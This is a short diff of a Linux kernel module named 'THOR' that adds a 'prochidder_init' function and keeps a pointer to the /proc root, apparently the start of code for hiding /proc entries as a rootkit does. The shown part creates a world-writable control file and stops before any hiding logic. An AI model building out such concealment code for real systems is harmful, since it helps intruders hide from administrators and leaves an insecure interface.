@@ -1,8 +1,11 @@
+#include <linux/fs.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
-#include <linux/kernel.h>
-#include <linux/init.h>
+
+#include "internals.h"
 
 #define LOG_TAG "THOR: "
 #define LOG_DEBUG(msg) printk(KERN_DEBUG LOG_TAG msg "\n")
@@ -12,6 +15,7 @@
 // ------------------------------------------------------------ PROTOTYPES
 static int __init thor_init(void);
 static int __init procfile_init(void);
+static int __init prochidder_init(void);
 static int procfile_open(struct inode *inode, struct file *file);
 static int procfile_read(struct seq_file *m, void *v);
 static ssize_t procfile_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos);
@@ -19,6 +23,7 @@ static void procfile_cleanup(void);
 
 // ------------------------------------------------------------ GLOBALS
 static struct proc_dir_entry *procfile;
+static struct proc_dir_entry *procroot;
 static struct file_operations procfile_fops = {
     .owner = THIS_MODULE,
     .open = procfile_open,
@@ -32,6 +37,7 @@ static struct file_operations procfile_fops = {
 static int __init thor_init(void)
 {
     procfile_init();
+    prochidder_init();
 
     LOG_INFO("init done");
     return 0;
@@ -43,6 +49,17 @@ static int __init procfile_init(void)
     procfile = proc_create("thor", 0666, NULL, &procfile_fops);
     if (procfile == NULL) {
         LOG_ERROR("could not create proc entry");
+        return -1;
+    }
+    procroot = procfile->parent;
+
+    return 0;
+}
+
+static int __init prochidder_init(void)
+{
+    if (procfile == NULL) {
+        LOG_ERROR("procfile not set");
         return -1;
     }
 
